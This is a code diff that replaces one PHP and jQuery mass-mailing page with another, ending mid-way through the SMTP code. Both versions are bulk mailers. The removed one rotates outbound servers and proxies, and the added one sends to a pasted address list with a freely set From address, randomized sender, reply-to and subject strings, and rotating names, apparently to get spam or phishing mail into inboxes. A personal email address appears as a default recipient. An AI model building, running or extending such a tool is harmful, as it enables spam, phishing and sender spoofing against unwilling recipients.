+        <input id="smtp_port" type="text" name="smtp_port" placeholder="SMTP Port" size="60"/>
+                </span>
+        </td>
+    </tr>
+    <tr>
+        <td width="5%">
+            <label for="use_smtp">
+                <div class="c3">Use SMTP</div>
+            </label>
+        </td>
+        <td width="45%">
+            <input type="checkbox" name="use_auth" value="use_auth">
+            <label for="use_smtp"><span class="c3">Use SMTP for authentication</span></label>
+        </td>
+    </tr>
+    <tr>
+        <td width="5%">
+            <div class="c3">
+                SMTP Username
+            </div>
+        </td>
+        <td width="45%">
+                <span class="c4">
+                    <input type="text" id="user" name="user" placeholder="SMTP Username" size="60"/>
+                </span>
+        </td>
+        <td width="4%">
+            <div class="c3">
+                SMTP port:
+            </div>
+        </td>
+        <td width="50%">
+                <span class="c4">
+        <input id="pass" type="text" name="pass" placeholder="SMTP pass" size="60"/>
+                </span>
+        </td>
+    </tr>
 
-.alexus-range .crange {
-    background-color: Orange;
-}
+</table>
 
-.alexus-range,.alexus-range .crange,.alexus-range .range-controller {
-    -webkit-border-radius: 3px;
-    -moz-border-radius: 3px;
-    border-radius: 3px;
-}
+<br/>
+<br/>
+<hr>
+<br/>
+<br/>
 
-.alexus-range {
-    width: 100%;
-    background-color: white;
-    text-align: left;
-    margin-top: 10px;
-    margin-bottom: 10px;
-}
+<table width="100%">
+    <input type="hidden" name="action" value="send"/>
+    <tr>
+        <td width="5%" height="36">
+            <div class="c3"> Email:</div>
+        </td>
+        <td width="41%"><span class="c4">
 
-.alexus-range .crange {
-    width: 0;
-}
+              <input class="validate[required,custom[email]]" type="text" id="from" name="from"
+                     placeholder="Base Adress" size="63"/>
 
-.alexus-range .range-controller {
-    width: 15px;
-    height: 25px;
-    margin-top: -24px;
-    margin-left: 0;
-    cursor: pointer;
-    padding: 0;
-}
 
-.barcounter {
-    position: absolute;
-    text-align: center;
-    width: 700px;
-}
+                </span></td>
+        <td width="4%">
+            <div class="c3"> Name:</div>
+        </td>
+        <td width="50%"><span class="c4">
+        <input id="realname" type="text" name="realname" placeholder="Names seperated by a comma [,]"
+               class="validate[required]" size="64"/>
+        </span></td>
+    </tr>
+    <tr>
+        <td width="5%" height="58">
+            <div class="c3"> Reply:</div>
+        </td>
+        <td width="41%"><span class="c4">
 
-.txtinput {
-    height: 28px;
-    min-height: 28px;
-}
+              <input id="replyto" type="text" name="replyto"
+                     placeholder="Base Reply:-to, same as sender email recommended" size="63"/>
 
-.form-horizontal .control-label {
-    width: 250px;
-}
 
-.form-horizontal .controls {
-    margin-left: 260px;
-}
+        <input id="checkbox" type="checkbox" name="checkbox"/>
 
-.button.white {
-    background-color: NavajoWhite;
-    color: #000;
-    text-shadow: 1px 1px NavajoWhite;
-}
+        <label style="" for="checkbox">
+            <span class="c3">Same as Email ? </span>
+        </label>
+      </span></td>
+        <td width="4%">
+            <div class="c3"> Attach File:</div>
+        </td>
+        <td width="50%"><span class="c4">
+        <input type="file" name="file" size="30"/>
+        </span></td>
+    </tr>
+    <tr>
+        <td width="5%" height="37">
+            <div class="c3"> Subject:</div>
+        </td>
+        <td colspan="3"><span class="c4">
+        <input id="subject" type="text" name="subject" placeholder="subjects seperated by ||" size="145"
+               class="validate[required]"/>
+        </span></td>
+    </tr>
+    <tr>
+        <td width="5%" height="37">
+            <div class="c3">
+                <p class="c5"> Priority </p>
+            </div>
+        </td>
+        <td><select name="xpriority" id="xpriority" class="validate[required]">
+                <option value="1"> Highest</option>
+                <option value="2"> High</option>
+                <option value="3"> Medium</option>
+                <option value="4"> Low</option>
+                <option value="5"> Lowest</option>
+            </select></td>
+        <td width="5%">
+            <div class="c3">
+                Encoding
+            </div>
+        </td>
+        <td>
 
-.button.large {
-    font-size: 125%;
-    padding: 7px 12px;
-}
+            <input name="Encoding" id="Encoding" type="radio" value="base64"/>
+            <span class="c3"> Base64 </span>
 
-.button.large:hover {
-    background-position: 0 -35px;
-}
+            <input name="Encoding" id="Encoding" type="radio" value="QUOTED-PRINTABLE" checked/>
+            <span class="c3"> Quoted printable </span>
 
-.button.large:active {
-    padding: 8px 12px 6px;
-    background-position: 0 top;
-}
+            <input name="Encoding" id="Encoding" type="radio" value="8bit"/>
+            <span class="c3"> 8bit </span>
 
-h2 {
-    margin-top: -15px;
-}
+            <input name="Encoding" id="Encoding" type="radio" value="7bit"/>
+            <span class="c3"> 7bit </span>
 
-#prime img, #help img, #settings img {
-    height: 24px;
-}
-#outprogressbar .barcounter {
-    width: 900px;
-}
-</style>
-<style type="text/less">
-.status {
-	padding: 5px;
-	/*.header {
-		b {
-			display: inline-block;
-			margin-top: -7px;
-		}
-		i {
-			display: block;
-			float: right;
-			margin-top: -3px;
-		}
-	}
-	.data {
-		padding-top: 10px;
-	}*/
-	.controls {
-		text-align: right;
-		float: right;
-	}
-}
-</style>
-<script src="http://cdnjs.cloudflare.com/ajax/libs/less.js/1.4.1/less.min.js" type="text/javascript"></script>
-<script>
-var Done=new Array();
-var maxDoneSize=25;
-var toDo=new Array();
-var additional=new Array(); var toDoSize=0;
-var enumer=0;
-var attachedFiles=new Array();
-var outServers={
-	active: false,
-	position: 0,
-	servers: new Array(),
-	servers_hash: "",
-	updateServers: function() {
-		if(this.servers_hash==$("#out_servers").val()) return;
-		this.servers_hash=$("#out_servers").val();
-		var tmpservers=this.servers_hash.split("\n");
-		this.servers=[];
-		for(var i in tmpservers) {
-			if(tmpservers[i].length<3) continue;
-			this.servers.push(tmpservers[i]);
-		}
-		this.position=0;
-	},
-	getServer: function() {
-		if(this.position>=this.servers.length) this.position=0;
-		var serv=this.servers[this.position];
-		this.position++;
-		return serv;
-	}
-}
-var threadNum=4;
-var timeoutNum=0;
-var AddNum=1;
-var status="stop";
+            <input name="Encoding" id="Encoding" type="radio" value="binary"/>
+            <span class="c3"> binary </span>
+            </div>
+        </td>
+    </tr>
+    <tr>
+        <td width="5%" height="179"
+            valign="top">
+            <div class="c3"> Mail HTML:</div>
+        </td>
+        <td width="41%"
+            valign="top"><span class="c4">
+        <textarea id="message_html" class="validate[required]" name="message_html" cols="50" rows="10">
+</textarea>
+        <br/>
+        </span></td>
+        <td width="4%"
+            valign="top">
+            <div class="c3"> Mail to:</div>
+        </td>
+        <td width="50%"
+            valign="top"><span class="c4">
+        <textarea id="emaillist" class="validate[required]" name="emaillist" cols="50" rows="10"
+                  placeholder="Emails go here, one email at a line">james_seen@hotmail.com</textarea>
+        </span></td>
+    </tr>
+    <tr>
+        <td width="5%"
+            valign="top">
+            <div class="c3"> Mail Text:</div>
+        </td>
+        <td width="41%"
+            valign="top"><span class="c4">
+       <input id="auto_gen_text" type="checkbox" name="auto_gen_text"/>
+        <label for="auto_gen_text" class="c3"> 
+        <span class="c3">Generate automatically from HTML ? (Not recommended)
+</span></label><br/>
+ <textarea id="message_text" class="validate[required]" name="message_text" cols="50" rows="10"></textarea>
+        <br/>
+       <br/></td>
+    </tr>
+</table>
+<br/>
+<br/>
 
-function ChangePass(login, pass) {
-	$.post('<?php print $_SERVER['PHP_SELF'];?>?changepass',{login:login,pass:pass}, function(data) {
-		var response=$.parseJSON(data);
-		if(response['result']=='ok') 
-			$("#passchangesuccess").show();
-		else
-			$("#passchangeerror").show();
+<div class="c2">
+    <input type="submit"
+           value="Send to Inbox !"/>
+</div>
+</form>
+    </body>
+    </html>
 
-	});
-}
-function pingoutservers() {
-	var servers=$("#out_servers").val();
-	if(servers=="") return;
-	window.pingout_servers=servers.split("\n");
-	window.pingout_servers_todo=window.pingout_servers.length;
-	$("#out_servers").val("");
-	$("#pingout_log").html("");
+<?php
+//TODO ADD ADDITIONAL HEADERS IN THE EMAIL ?
+if (isset($_POST['action'])) {
+    $action = $_POST['action'];
+    $emaillist = $_POST['emaillist'];
+    $from = $_POST['from'];
+    $replyto = $_POST['replyto'];
+    $XPriority = $_POST['xpriority'];
+    $subject = stripslashes($_POST['subject']);
 
-	update_pingoutprogress();
-	for(var i=0; i<4; i++)
-		pingout_server();
-}
-function pingout_server() {
-	if(window.pingout_servers.length==0) return;
-	var server=window.pingout_servers.pop();
-	$.post('<?php print $_SERVER['PHP_SELF'];?>?pingoutserver',{server:server}, function(data) {
-		var result=$.parseJSON(data);
-		var log=$("#pingout_log").html();
-		if(result.status=="GOOD") {
-			$("#pingout_log").html(log+"<span style='color:green;'>"+result.server+" работает</span><br>");
-			$("#out_servers").val($("#out_servers").val()+result.server+"\n");
-		} else {
-			$("#pingout_log").html(log+"<span style='color:red;'>"+result.server+" ошибка: "+result.error+"</span><br>");
-		}
-		$("#pingout_log").scrollTop($("#pingout_log").prop("scrollHeight"));
+    $realname = $_POST['realname'];
+    $encoding = $_POST['Encoding'];
 
-		update_pingoutprogress();
-		pingout_server();
-	});
-}
-function update_pingoutprogress() {
-	var pingoutservers_done=window.pingout_servers_todo-window.pingout_servers.length;
-	var opb=$("#outprogressbar");
-	$(opb).find(".barcounter").text(pingoutservers_done+"/"+window.pingout_servers_todo);
-	var percent=parseInt(pingoutservers_done/(window.pingout_servers_todo/100));
-	$(opb).find(".bar").css("width",percent+"%");
-}
-function Send(){
-	enumer=0;
-	if($("#use_out_servers").is(':checked')) {
-		outServers.updateServers();
-		outServers.active=true;
-	} else {
-		outServers.active=false;
-	}
-
-	
-	var res=$("#to").val().match(/\[FILE:(.+?)\]/);
-	if(res!=null) {
-		var pattern=res[0];
-		var file_path=res[1];
-		$.post("?linesinfile",{file_path:file_path},function(data){
-			var linesinfile=parseInt(data);
-			toDo=[];
-			for(var i=0;i<linesinfile;i++)
-				toDo.push(pattern);
-			toDoSize=toDo.length;
-			SetProgressBar(0,"0/"+toDoSize);
-			ResumeSendMail();
-		});
-	} else {
-		toDo=$("#to").val().split("\n");
-		toDoSize=toDo.length;
-		SetProgressBar(0,"0/"+toDoSize);
-		ResumeSendMail();
-	}
-}
-function PauseSendMail() {
-	status="pause";
-	$("#PauseSendMail").prop("disabled",true);
-	$("#ResumeSendMail, #StopSendMail").prop("disabled",false);
-	$(".status span.tr-status-idle").removeClass("label-success label-warning").addClass("label-danger").text("<?php tr('status-pause',false);?>");
-}
-function ResumeSendMail() {
-	status="start";
-	$("#ResumeSendMail").prop("disabled",true);
-	$("#PauseSendMail, #StopSendMail").prop("disabled",false);
-	$(".status span.tr-status-idle").removeClass("label-danger label-warning").addClass("label-success").text("<?php tr('status-sending',false);?>");
-	for(var i=0; i<threadNum; i++) SendMail();
-}
-function StopSendMail() {
-	status="stop";
-	StopSendMailHandler();
-}
-function Preview(){
-		var params={
-		to		:"null@null.null",
-		fromname:ReplaceEnum($("#fromname").val(), false),
-		frommail:ReplaceEnum($("#frommail").val(), false),
-		replymail:ReplaceEnum($("#replymail").val(), false),
-		tema	:ReplaceEnum($("#tema").val(), false),
-		type	:$("#type").val(),
-		text	:ReplaceEnum($("#text").val()),
-		enumer  :(toDoSize-toDo.length)
-	};
-		if(additional.length==0)
-		$(".additional").each(function(){
-			additional.push(ReplaceEnum($(this).val()));
-		});
-	else
-		$(".additional").each(function(index, value){
-			if(index<additional.length) return;
-			additional.push(ReplaceEnum($(this).val()));
-		});
-	for(i in additional) {
-		params["additional["+i+"]"]=additional[i];
-	}
-	$.post('<?php print $_SERVER['PHP_SELF'];?>?preview', params, function(data){
-		if($("#type").val()=='text')
-			showPreviewWindow('data:text/plain;charset=utf-8;base64,'+Base64.encode(data));
-		else
-			showPreviewWindow('data:text/html;charset=utf-8;base64,'+Base64.encode(data));
-			});
-}
-function StopSendMailHandler() {
-	//alert("Рассылка завершена!");
-	$(".status span.tr-status-idle").removeClass("label-success label-danger").addClass("label-warning").text("<?php tr('status-idle',false);?>");
-	$(".status .btn").prop("disabled",true);
-}
-function SendMail() {
-	if(status=="pause")
-		return;
-	else if(status=="stop") {
-		//toDo=[];
-		//toDoSize=0;
-		//SetProgressBar((toDoSize-toDo.length)/(toDoSize/100),(toDoSize-toDo.length)+"/"+toDoSize);
-		return;
-	}
-	
-	if(toDo.length==0) {//!email || email=="" || email==" ") {
-		//останавливаем остальные потоки и генерируем событие окончания рассылки
-		status="stop";
-		StopSendMailHandler();
-		return;
-	}
-	var email=toDo.pop();
-	
-	additional=new Array();
-	if(email.indexOf(";")!=-1) {
-		var emailadds=email.split(";");
-		for(var adds in emailadds) {
-			if(adds==0) 
-				email=emailadds[0];
-			else
-				additional.push(emailadds[adds]);
-		}
-	}
-	var params={
-		to		:email,
-		fromname:ReplaceEnum($("#fromname").val(), false),
-		frommail:ReplaceEnum($("#frommail").val(), false),
-		replymail:ReplaceEnum($("#replymail").val(), false),
-		tema	:ReplaceEnum($("#tema").val(), false),
-		type	:$("#type").val(),
-		captcha_code:$("input[name=captcha_code]").val(),
-		text	:ReplaceEnum($("#text").val()),
-		enumer  :(toDoSize-toDo.length)
-	};
-	//1.6.5 (16.09.2013) прокси
-	if($("#use_proxy_server").is(":checked")) params['PROXY']=$("#proxy_server_uri").val();
-
-	if(attachedFiles.length!=0) params['files']=JSON.stringify(attachedFiles);
-
-	if(additional.length==0)
-		$(".additional").each(function(){
-			additional.push(ReplaceEnum($(this).val()));
-		});
-	else
-		$(".additional").each(function(index, value){
-			if(index<additional.length) return;
-			additional.push(ReplaceEnum($(this).val()));
-		});
-	for(i in additional) {
-		params["additional["+i+"]"]=additional[i];
-	}
-	if(outServers.active) params["outserver"]=outServers.getServer();
-
-	$.post('<?php print $_SERVER['PHP_SELF'];?>?send', params, function(data){
-		if(data=="CAPTCHA ERROR") {
-			$("#console").html("<?php tr('badcaptcha');?>");
-			$("#console").css("background-color","Tomato");
-						return;
-		} else if(data=="OUT OF LIMIT") {
-			$("#console").html("<?php tr('sendlimit');?>");
-			$("#console").css("background-color","Tomato");
-						return;
-		}
-				$("#console").html(data);
-		$("#console").css("background-color","YellowGreen");
-		var email=data.split(" ");
-		AddDone(email[2]);
-		DrawDone();
-		SetProgressBar((toDoSize-toDo.length)/(toDoSize/100),(toDoSize-toDo.length)+"/"+toDoSize);
-		if(timeoutNum==0)
-			SendMail();
-		else
-			setTimeout(function(){SendMail()},timeoutNum*1000);
-	});
-}
-function SetProgressBar(count,text) {
-	var psize=parseInt($("#progressbar").css("width"))/100;
-	$("#progressbar .bar").css("width",count+"%");
-	$("#progressbar .barcounter").text(text);
-}
-function AddDone(item) {
-	if(Done.length>maxDoneSize)
-		Done.splice(0,1);
-	Done.push(item);
-}
-function DrawDone() {
-	$("#ext-console").html("");
-	var txt="";
-	for(i in Done) {
-		txt=Done[i]+"<br>"+txt;
-	}
-	$("#ext-console").html(txt);
-}
-function dThreads(){
-	if(threadNum==1) return;
-	threadNum--;
-	ShowThreads();
-}
-function iThreads(){
-	if(threadNum==100) return;
-	threadNum++;
-	ShowThreads();
-}
-function ShowThreads() {
-	$("#THREADS").text(threadNum);
-}
-function ShowUpload() {
-	$("#FileUploadDialog").modal("show");
-}
-function HideUpload() {
-	$("#FileUploadDialog").modal("hide");
-}
-function HideAttache() {
-	$("#univarsalUpload").hide();
-}
-function showUniversalUpload() {
-	if($("#univarsalUpload").css("display")=="none") {
-		$("#univarsalUpload").children(".modal-body").children("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?upload_universal");
-		$("#univarsalUpload").modal("show");
-	} else $("#univarsalUpload").modal("hide");
-}
-function UploadClickHandler(object) {
-	$(object).parent().parent().children(".modal-body").children("iframe").contents().find("form").submit();
-}
-window.uploadFinishedHandler=function(data) {
-	if(data==null) return;
-	var file=$.parseJSON(Base64.decode(data));
-	attachedFiles.push(file);
-	updateFileList();
-	$("#univarsalUpload").modal("hide");
-}
-function updateFileList() {
-	$("#attachedFiles").html("");
-	for(var file in attachedFiles) {
-		if(file=='remove') continue;
-		$("#attachedFiles").html($("#attachedFiles").html()+(file!=0?"<br>":"")+"<i class='icon-file'></i> "+attachedFiles[file]['name']+" <button class='btn' onclick='removeFile("+file+");return false'><?php tr('delete',false);?></button>");
-	}
-}
-function removeFile(id) {
-	delete attachedFiles[id];
-	updateFileList();
-}
-function TogleLoadSave() {
-	if($("#LoadSaveDialog").css("display")=="none") {
-		$("#LoadSaveDialog").find("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?loadsave");
-		$("#LoadSaveDialog").modal("show");		
-	} else {
-		$("#LoadSaveDialog").modal("hide");
-	}
-}
-function upload_finished(data) {
-	$("#to").val(data.replace(new RegExp(" ",'g'),"\n"));
-	$("#FileUploadDialog").children("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?upload_form");
-	HideUpload();
-}
-function AddField(object) {
-	$(object).parent().parent().after('<br><div class="input-prepend"><span class="add-on">[ADD'+AddNum+']</span></div> <input type="text" name="additional'+AddNum+'" id="additional'+AddNum+'" class="input-xlarge txtinput additional" placeholder="<?php tr('addfield2',false);?> '+AddNum+'"> <div class="input-append"><span class="add-on"><span class="addfield" onclick="AddField(this)">+</span></span>');
-	$(object).parent().parent().remove();
-	AddNum++;
-}
-function SaveData() {
-	$("#LoadSaveDialog").find("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?savedata").load(function(){
-		$("#LoadSaveDialog").find("iframe").unbind("load");
-				var data="[FROM-NAME]"+$("#fromname").val()+"\n"+"[FROM-EMAIL]"+$("#frommail").val()+"\n"+"[THEME]"+$("#tema").val()+"\n"+"[TYPE]"+$("#type").val()+"\n";
-				$(".additional").each(function(index, value){
-			data+="[ADD"+index+"]"+$(value).val()+"\n";
-		});	
-				if(attachedFiles.length!=0) data+='[FILES]'+JSON.stringify(attachedFiles)+"\n";
-		
-				data+="[TEXT]"+$("#text").val().replaceAll("&","&amp;");
-		
-		$("textarea",$(this).contents()).val(data);
-		$("form",$(this).contents()).submit();
-	});
-}
-function loadsave(data) {
-	var content=data.split("[TEXT]");
-	$("#text").val(content[1].replaceAll("&amp;","&"));
-	content=content[0].split("\n");
-	for(var i in content) {
-		if(content[i].indexOf("[FROM-NAME]")!=-1) {
-			content[i]=content[i].replace("[FROM-NAME]","");
-			$("#fromname").val(content[i]);
-		} else if(content[i].indexOf("[FROM-EMAIL]")!=-1) {
-			content[i]=content[i].replace("[FROM-EMAIL]","");
-			$("#frommail").val(content[i]);
-		} else if(content[i].indexOf("[THEME]")!=-1) {
-			content[i]=content[i].replace("[THEME]","");
-			$("#tema").val(content[i]);
-		} else if(content[i].indexOf("[TYPE]")!=-1) {
-			content[i]=content[i].replace("[TYPE]","");
-			$("#type [value='"+content[i]+"']").attr("selected", "selected");
-		} else if(content[i].indexOf("[FILES]")!=-1) {
-			content[i]=content[i].replace("[FILES]","");
-			attachedFiles=$.parseJSON(content[i]);
-			updateFileList();
-		} else if(content[i].indexOf("[ADD")!=-1) {
-			var result=/\[ADD(\d+)\]/.exec(content[i]);
-			if(AddNum<=result[1]) {
-				AddField($(".addfield:last"));
-			}
-			content[i]=content[i].replace(result[0],"");
-			$("#additional"+result[1]).val(content[i]);
-		}
-	}
-	TogleLoadSave();
-}
-$(document).ready(function(){
-	
-	$("#prime, .prime-button").click(function(){
-		$(".section-screen").hide();
-		$("#prime-screen").show();
-	});
-	$("#help").click(function(){
-		$(".section-screen").hide();
-		$("#help-screen").show();
-	});
-	$("#settings").click(function(){
-		$(".section-screen").hide();
-		$("#settings-screen").show();
-	});
-	$(".btn-checkbox").click(function() {
-		if($(this).hasClass("btn-success")) {
-			$($(this).attr("data-toggle")).prop("checked",false);
-			$(this).removeClass("btn-success").addClass("btn-danger").children("i").removeClass("icon-ok").addClass("icon-remove");
-		} else {
-			$($(this).attr("data-toggle")).prop("checked",true);
-			$(this).removeClass("btn-danger").addClass("btn-success").children("i").removeClass("icon-remove").addClass("icon-ok");
-		}
-	});
-	$("#maxDoneSize").change(function() {
-		maxDoneSize=$(this).val();
-	});
-	alexusRange.create($("#TIMEOUT_RANGE"));
-	alexusRange.change($("#TIMEOUT_RANGE"),function(range) {
-		isetTimeout(alexusRange.get($(range)));
-		$("#TIMEOUT").val(timeoutNum);
-	});
-	$("#TIMEOUT").keyup(function() {
-		isetTimeout($(this).val());
-		alexusRange.set($("#TIMEOUT_RANGE"),timeoutNum);
-	});
-	alexusRange.set($("#TIMEOUT_RANGE"),timeoutNum);
-	$("[rel=tooltip]").tooltip();
-	ShowThreads();
-	});
-
-function isetTimeout(val) {
-	var newTimeout=parseInt(val);
-	if(newTimeout<0) 
-		timeoutNum=0;
-	else if(newTimeout>14400)
-		timeoutNum=14400;
-	else
-		timeoutNum=newTimeout;
-}
-function MakeBold() {
-	wrapText("text","<b>","</b>");
-}
-function MakeItalic() {
-	wrapText("text","<i>","</i>");
-}
-function MakeUnderline() {
-	wrapText("text","<u>","</u>");
-}
-function ReplaceEnum(data) {
-	return data;
-	//Этот функционал перенесен в php часть
-}
-function MakeReverse() {
-	var textArea = $("#text");
-    var len = textArea[0].value.length;
-    var start = textArea[0].selectionStart;
-    var end = textArea[0].selectionEnd;
-    var selectedText = textArea[0].value.substring(start, end);
-    selectedText=selectedText.split("").reverse().join("");
-    var replacement = "<span style=\"direction: rtl;unicode-bidi: bidi-override;\">" + selectedText + "</span>";
-    textArea[0].value=textArea[0].value.substring(0, start) + replacement + textArea[0].value.substring(end, len);
-}
-function wrapText(elementID, openTag, closeTag) {
-    var textArea = $('#' + elementID);
-    var len = textArea[0].value.length;
-    var start = textArea[0].selectionStart;
-    var end = textArea[0].selectionEnd;
-    var selectedText = textArea[0].value.substring(start, end);
-    var replacement = openTag + selectedText + closeTag;
-    textArea[0].value=textArea[0].value.substring(0, start) + replacement + textArea[0].value.substring(end, len);
-}
-function showPreviewWindow(link) {
-	$("#preview-screen").find("iframe").attr("src", link);
-	$(".section-screen").hide();
-	$("#preview-screen").show();
-	$(window).scrollTop(0);
-}
-var alexusRange={
-	mouseX:0,
-	newX:0,
-	rangeCounter:0,
-	changeHandlers:{},
-	create:function(range) {
-		$(range).addClass("alexus-range").addClass("well").append('<div class="crange"></div><div class="range-controller btn"></div>');
-		if(alexusRange.rangeCounter==0) $(document).mouseup(alexusRange.mouseupHandler);
-		$(range).children(".range-controller").mousedown(alexusRange.mousedownHandler);
-		alexusRange.rangeCounter++;
-		$(range).attr("ruqid",alexusRange.rangeCounter);
-	},
-	RangeMouseMoveHandler:function(e) {
-				if(alexusRange.mouseX==0) alexusRange.mouseX=e.pageX;
-		alexusRange.newX=e.pageX
-		if(e.pageX!=alexusRange.mouseX)
-			$(".alexus-range .range-controller[state=inmove]").each(function() {
-				var max_pos=parseInt($(this).parent().css("width"))-parseInt($(this).css("width"))-2;
-				var cur_pos=parseInt($(this).css("margin-left"));
-				var delta=alexusRange.mouseX-alexusRange.newX;
-				if(cur_pos-delta<0) 
-					cur_pos=0;
-				else if(cur_pos-delta>max_pos) 
-					cur_pos=max_pos;
-				else
-					cur_pos-=delta;
-				$(this).css("margin-left", cur_pos);
-				$(this).parent().children(".crange").css("width",parseInt(cur_pos/(max_pos/100))+"%");
-				if(alexusRange.changeHandlers[alexusRange.uniqueId($(this).parent())]!=undefined) 
-					alexusRange.changeHandlers[alexusRange.uniqueId($(this).parent())]($(this).parent());
-			});
-		alexusRange.mouseX=alexusRange.newX;
-	},
-	change:function(range, handler) {
-		alexusRange.changeHandlers[alexusRange.uniqueId($(range))]=handler;
-	},
-	mousedownHandler:function() {
-				$(this).attr("state","inmove");
-		$(document).mousemove(alexusRange.RangeMouseMoveHandler); 
-	},
-	mouseupHandler:function() {
-		$(".alexus-range .range-controller[state=inmove]").attr("state","relax");
-		$(document).unbind("mousemove", alexusRange.RangeMouseMoveHandler);
-		alexusRange.ResetPos(); 
-	},
-	ResetPos:function() {
-		alexusRange.mouseX=0;
-	},
-	get:function(range) {
-		var max_pos=parseInt($(range).css("width"))-parseInt($(range).children(".range-controller").css("width"))-2;
-		var cur_pos=parseInt($(range).children(".range-controller").css("margin-left"));
-		var max_val=parseInt($(range).attr("max"));
-		var min_val=parseInt($(range).attr("min"));
-		return parseInt((max_val-min_val)*(cur_pos/max_pos))+min_val;	
-	},
-	set:function(range, val) {
-		var max_pos=parseInt($(range).css("width"))-parseInt($(range).children(".range-controller").css("width"))-2;
-		var cur_pos=parseInt($(range).children(".range-controller").css("margin-left"));
-		var max_val=$(range).attr("max");
-		var min_val=$(range).attr("min");
-		var pos=parseInt(max_pos*(((val-min_val)/(max_val-min_val))));
-		if(pos<0) 
-			pos=0;
-		else if(pos>max_pos) 
-			pos=max_pos;
-		$(range).children(".range-controller").css("margin-left",pos);
-		$(range).children(".crange").css("width",parseInt(pos/(max_pos/100))+"%");
-	},
-	uniqueId:function(range) {
-		return $(range).attr("ruqid");
-	}
-}
-function setLang(code) {
-	if(code=='ru') {
-		setCookie('translation','ru',{path:"/"});
-				document.location.reload();
-	} else {
-		setCookie('translation',code,{path:"/"});
-				document.location="/"+code+"/";
-				document.location.reload();
-	}
-}
-function setCookie(name, value, props) {
-    props = props || {}
-    var exp = props.expires
-    if (typeof exp == "number" && exp) {
-        var d = new Date()
-        d.setTime(d.getTime() + exp*1000)
-        exp = props.expires = d
+    if (isset($_POST['file'])) {
+        $file_name = $_POST['file'];
+    } else {
+        $file_name = NULL;
     }
-    if(exp && exp.toUTCString) { props.expires = exp.toUTCString() }
- 
-    value = encodeURIComponent(value)
-    var updatedCookie = name + "=" + value
-    for(var propName in props){
-        updatedCookie += "; " + propName
-        var propValue = props[propName]
-        if(propValue !== true){ updatedCookie += "=" + propValue }
+
+
+    // process message
+    $message_html = $_POST['message_html'];
+    $message_html = urlencode($message_html);
+    $message_html = str_ireplace("%5C%22", "%22", $message_html);
+    $message_html = urldecode($message_html);
+    $message_html = stripslashes($message_html);
+
+    $message_text = $_POST['message_text'];
+    $message_text = urlencode($message_text);
+    $message_text = str_ireplace("%5C%22", "%22", $message_text);
+    $message_text = urldecode($message_text);
+    $message_text = stripslashes($message_text);
+
+
+    $allemails = explode("\n", $emaillist);
+    $numemails = count($allemails);
+
+    $names = explode(',', $realname);
+    $subjects = explode("||", $subject);
+
+    echo "Parsed your E-mail, let the magic happen ! <br><hr>";
+
+    function randomizeInteger($input = "")
+    {
+        $findme = '[random_int]';
+        $pos = stripos($input, $findme);
+        if ($pos !== FALSE) {
+            $wahib = substr_replace($input, mt_rand(1000, 999999), $pos, 12);
+            $pos = stripos($wahib, $findme);
+            while ($pos !== FALSE) {
+                $wahib = substr_replace($wahib, mt_rand(1000, 999999), $pos, 12);
+                $pos = stripos($wahib, $findme);
+            }
+            return $wahib;
+        } else {
+            return $input;
+        }
     }
-    document.cookie = updatedCookie
- 
+
+    function randomizeString($input = "")
+    {
+        $findme = '[random_string]';
+        $pos = stripos($input, $findme);
+        if ($pos !== FALSE) {
+            $wahib = substr_replace($input, generateRandomString(15), $pos, 15);
+            $pos = stripos($wahib, $findme);
+            while ($pos !== FALSE) {
+                $wahib = substr_replace($wahib, generateRandomString(15), $pos, 15);
+                $pos = stripos($wahib, $findme);
+            }
+            return $wahib;
+        } else {
+            return $input;
+        }
+    }
+
+    function generateRandomString($length = 10)
+    {
+        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@';
+        $randomString = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomString .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $randomString;
+    }
+
+
+    for ($x = 0; $x < $numemails; $x++) {
+        $to = $allemails[$x];
+
+        if (preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/", $to)) {
+            $date = date('Y/m/d H:i:s');
+            $to = str_ireplace(" ", "", $to);
+
+            // Dynamically generate send information
+            echo "$x: Generating E-mail.";
+            flush();
+
+            // generate sender email information
+            $sender = randomizeString($from);
+            $sender = randomizeInteger($sender);
+            echo ".";
+            flush();
+
+            // generate reply-to email information
+            if (isset($_POST['checkbox'])) {
+                $reply2 = $sender;
+            } else {
+
+                $reply2 = randomizeString($replyto);
+                $reply2 = randomizeInteger($reply2);
+            }
+            echo ".";
+            flush();
+
+            // generate realname information
+            $send_name = $names[array_rand($names)];
+            echo ".";
+            flush();
+
+            // generate title information
+            $title = $subjects[array_rand($subjects)];
+            $title = randomizeString($title);
+            $title = randomizeInteger($title);
+            $title = str_ireplace("&to&", $to, $title);
+            $title = str_ireplace("&from&", $sender, $title);
+            echo ". => ";
+            flush();
+
+
+            // generate message information
+            $sent_html = str_ireplace("&to&", $to, $message_html);
+            $sent_html = str_ireplace("&from&", $sender, $sent_html);
+            $sent_html = str_ireplace("&date&", $date, $sent_html);
+            $sent_html = randomizeString($sent_html);
+            $sent_html = randomizeInteger($sent_html);
+
+
+            if (isset($_POST['auto_gen_text'])) {
+                $sent_text = strip_tags($sent_html);
+            } else {
+                $sent_text = str_ireplace("&to&", $to, $message_text);
+                $sent_text = str_ireplace("&from&", $sender, $sent_text);
+                $sent_text = str_ireplace("&date&", $date, $sent_text);
+                $sent_text = randomizeString($sent_text);
+                $sent_text = randomizeInteger($sent_text);
+                $sent_text = strip_tags($sent_text);
+            }
+
+
+            //send email here, with previously intergrated variables and PHPMailer Class.
+            // Generate header information
+            print "Sending to $to - Subject: $title - Sender name: $send_name - Sender email: $sender - reply-to: $reply2 => ";
+            flush();
+
+
+            $mail = new PHPmailer();
+            $mail->Priority = $XPriority;
+            $mail->Encoding = $encoding;
+            $mail->SetFrom($sender);
+            $mail->FromName = $send_name;
+            $mail->AddReplyTo($send_name, $reply2);
+            $mail->AddAddress($to);
+            $mail->Body = $sent_html;
+            $mail->IsHTML(true);
+            $mail->Subject = $title;
+            $mail->AltBody = $sent_text;
+            $mail->addCustomHeader("Reply-To: $send_name <$reply2>");
+
+
+            //if we are using SMTP
+            if (isset($_POST['use_smtp'])) {
+                $mail->SMTPAuth = true;                  // enable SMTP authentication
+                $mail->Host = $_POST['smtp_host']; // sets the SMTP server
+                $mail->Port = 26;
+
